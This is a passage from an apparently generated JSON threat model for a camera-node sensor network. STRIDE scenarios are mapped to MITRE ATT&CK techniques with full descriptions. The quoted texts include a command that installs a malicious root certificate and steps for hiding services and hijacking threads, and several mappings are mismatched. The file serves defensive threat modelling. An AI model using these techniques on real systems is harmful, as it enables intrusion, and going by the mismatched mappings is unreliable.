                "id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
                "technique_id": "T1562.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee or insider modifies system configuration without leaving adequate traceability.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if configuration management practices are weak."
                },
                {
                    "Assumption": "Access controls for configuration changes are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Valid if configuration access is poorly managed."
                },
                {
                    "Assumption": "There is no separation of duties or independent review of configuration changes.",
                    "Role": "Organization Policy Maker",
                    "Condition": "Valid if changes are not independently reviewed."
                }
            ],
            "Potential Impact": "Inability to trace and attribute configuration changes, leading to potential system misconfigurations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration changes",
                "traceability",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted visual data transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unencrypted channels.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption is not implemented."
                },
                {
                    "Assumption": "The attacker can access the network communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access controls are weak."
                },
                {
                    "Assumption": "Network monitoring does not detect unauthorized interception.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if monitoring is inadequate."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "unencrypted data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised camera nodes exfiltrate visual data to unauthorized external servers.",
            "Assumptions": [
                {
                    "Assumption": "Nodes do not have outbound data controls or monitoring.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if outbound traffic is not controlled."
                },
                {
                    "Assumption": "The attacker can direct compromised nodes to external servers.",
                    "Role": "Attacker",
                    "Condition": "Valid if command and control is feasible."
                },
                {
                    "Assumption": "There are no alerts for unusual data transfer activities.",
                    "Role": "Security Solutions",
                    "Condition": "Valid if data transfer alerts are not implemented."
                }
            ],
            "Potential Impact": "Data breaches leading to loss of confidentiality and potential regulatory non-compliance.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exfiltration",
                "external servers",
                "compromised nodes"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Man-in-the-middle attack on network to capture visual data streams.",
            "Assumptions": [
                {
                    "Assumption": "Network communication channels are accessible and can be intercepted.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is weak or unmonitored."
                },
                {
                    "Assumption": "Data streams are not encrypted or use weak encryption methods.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption standards are not robust."
                },
                {
                    "Assumption": "An attacker can perform the attack without triggering alarms.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if monitoring and intrusion detection are ineffective."
                }
            ],
            "Potential Impact": "Unauthorized access to visual data compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "man-in-the-middle",
                "data streams",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with traffic to disrupt the transmission and processing of visual data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate significant traffic towards the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network traffic controls are weak."
                },
                {
                    "Assumption": "Network capacity is insufficient to handle high traffic volumes.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network scaling and robustness are inadequate."
                },
                {
                    "Assumption": "There are no defenses like rate limiting or DDoS protections.",
                    "Role": "System Architect",
                    "Condition": "Valid if DDoS protections are not implemented."
                }
            ],
            "Potential Impact": "Disruption to visual data transmission and network availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "traffic overload",
                "system disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in device firmware to crash camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to exploit known or zero-day vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if device protection against exploits is weak."
                },
                {
                    "Assumption": "Camera nodes do not have automatic or timely firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware management is poor."
                },
                {
                    "Assumption": "There is no monitoring or quick recovery mechanism for device failures.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if failure recovery processes are inadequate."
                }
            ],
            "Potential Impact": "Loss of visual data capturing capabilities impacting data availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "device crash",
                "firmware vulnerability",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Remote code execution via vulnerable network services causes system downtime.",
            "Assumptions": [
                {
                    "Assumption": "The network services are vulnerable to remote code execution attacks.",
                    "Role": "System Architect",
                    "Condition": "Valid if security patches are not applied."
                },
                {
                    "Assumption": "Attackers have the capability to exploit the service vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers are aware of vulnerabilities."
                },
                {
                    "Assumption": "There are no real-time defenses against such exploits.",
                    "Role": "Security Systems",
                    "Condition": "Valid if defenses are outdated or missing."
                }
            ],
            "Potential Impact": "System downtime leading to loss of availability and disruption of visual data processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "remote code execution",
                "network services",
                "system shutdown"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains root access to the camera nodes using privilege escalation techniques.",
            "Assumptions": [
                {
                    "Assumption": "Exploit mechanisms like unpatched vulnerabilities or insecure configurations exist.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if system hardening is inadequate."
                },
                {
                    "Assumption": "The attacker can execute privilege escalation exploits successfully.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploits are feasible and undetected."
                },
                {
                    "Assumption": "There are insufficient privilege segregation and monitoring mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Valid if privilege controls are weak."
                }
            ],
            "Potential Impact": "Full control over camera nodes compromising all three principles: confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "privilege escalation",
                "camera nodes"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Usage of previously compromised lower-privileged accounts to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Lower-privileged accounts are not monitored for suspicious activity.",
                    "Role": "System Administrator",
                    "Condition": "Valid if user activity monitoring is weak."
                },
                {
                    "Assumption": "Access control measures are insufficient to prevent privilege escalation.",
                    "Role": "System Architect",
                    "Condition": "Valid if access controls are not strong enough."
                },
                {
                    "Assumption": "There are known privilege escalation vulnerabilities in the system.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities exist and are unpatched."
                }
            ],
            "Potential Impact": "Unauthorized administrative access compromising data integrity and system security.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "administrative access",
                "compromised accounts"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Injection of malicious code via a lower privileged process enabling attacker to gain higher system privileges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a lower privileged process.",
                    "Role": "Attacker",
                    "Condition": "Valid if lower privileged processes are insufficiently protected."
                },
                {
                    "Assumption": "Exploits capable of privilege escalation are feasible.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if exploits are unmitigated."
                },
                {
                    "Assumption": "Security controls do not detect malicious code injection.",
                    "Role": "Security Systems",
                    "Condition": "Valid if detection mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Higher system privileges obtained enabling broader control and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "code injection",
                "system privileges",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Thread Execution Hijacking",
                "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
                "technique_id": "T1055.003"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to a camera node by spoofing the identity of a legitimate node, thereby gaining unauthorized access to the visual data streams.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can obtain network credentials",
                    "Role": "Attacker",
                    "Condition": "Network credentials are not secured properly"
                },
                {
                    "Assumption": "The network does not have robust device authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "Device authentication is weak or absent"
                }
            ],
            "Potential Impact": "Unauthorized access to visual data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a falsified certificate to intercept communications between camera nodes and the central hub.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate or obtain a phony certificate",
                    "Role": "Attacker",
                    "Condition": "Certificate issuance procedures are not secure"
                },
                {
                    "Assumption": "The system does not validate certificates against a trusted authority",
                    "Role": "System Designer",
                    "Condition": "Proper SSL/TLS validation is not implemented"
                }
            ],
            "Potential Impact": "Interception and potential modification of data in transit, leading to compromised confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "certificate",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate administrative interface to capture credentials from system administrators.",
            "Assumptions": [
                {
                    "Assumption": "Administrators access the interface over an unsecured network",
                    "Role": "Administrator",
                    "Condition": "Use of unsecured networks for administrative tasks"
                },
                {
                    "Assumption": "The administrative interface does not use two-factor authentication",
                    "Role": "System Designer",
                    "Condition": "Lack of multi-factor authentication"
                }
            ],
            "Potential Impact": "Compromise of administrative credentials, leading to unauthorized access and control.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "interface",
                "credentials",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of a camera node to inject malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely signed",
                    "Role": "System Designer",
                    "Condition": "Lack of digital signature verification for firmware"
                },
                {
                    "Assumption": "Physical access to the device is possible",
                    "Role": "Attacker",
                    "Condition": "Inadequate physical security controls"
                }
            ],
            "Potential Impact": "Alteration of visual data and potential network compromise, affecting both integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "malicious code"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a known vulnerability in the XML processing library to alter the configuration files of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "The application uses the vulnerable XML processing library",
                    "Role": "System Designer",
                    "Condition": "Use of deprecated or insecure libraries"
                },
                {
                    "Assumption": "The attacker can send specially crafted XML input",
                    "Role": "Attacker",
                    "Condition": "Lack of input validation"
                }
            ],
            "Potential Impact": "Configuration changes leading to unauthorized access, potentially compromising all aspects: confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "XML",
                "configuration",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Plist Modification",
